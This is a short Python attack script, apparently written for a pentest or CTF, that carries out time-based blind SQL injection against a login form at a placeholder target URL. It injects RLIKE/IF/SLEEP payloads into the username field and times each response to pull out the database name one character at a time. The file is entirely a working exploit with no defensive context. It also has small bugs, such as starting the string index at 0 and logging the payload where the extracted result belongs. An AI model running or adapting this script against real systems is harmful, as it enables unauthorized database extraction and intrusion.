#!/usr/bin/python3

import requests, time, sys, signal 
from pwn import *

def def_handler(sig, frame) : 
    log.failure( "Finishing...") 
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = 'https://target.com/login.php' 
burp = {'https': 'https://127.0.0.1:8080'} 
s = r'0123456789abcdefghijklmnopqrstuvwxyz_()-.' 
result = ''

def check(payload):

    data_post={
        'user': '%s' % payload, 
        'pass': 'test'

    }

    time_start = time.time()
    content = requests.post(url, data=data_post) 
    time_end = time.time()

    if time_end - time_start > 5: 
        return 1
p1 = log.progress("Database")
p2 = log.progress("Payload")

for i in range(0, 20):
    for c in s:
#' RLIKE SLEEP(5) AND 'aMSH'='aMSH&pass=
        payload= "' RLIKE IF(MID(database(),%d, 1) = '%c', sleep(5),1) AND 'aMSH'='aMSH&pass=&pass=admin" % (i, c)
        p2.status("%s" % payload)

        if check(payload): 
            result += c
            p1.status("%s" % result)
            break
log.info("Database: %s" % payload)
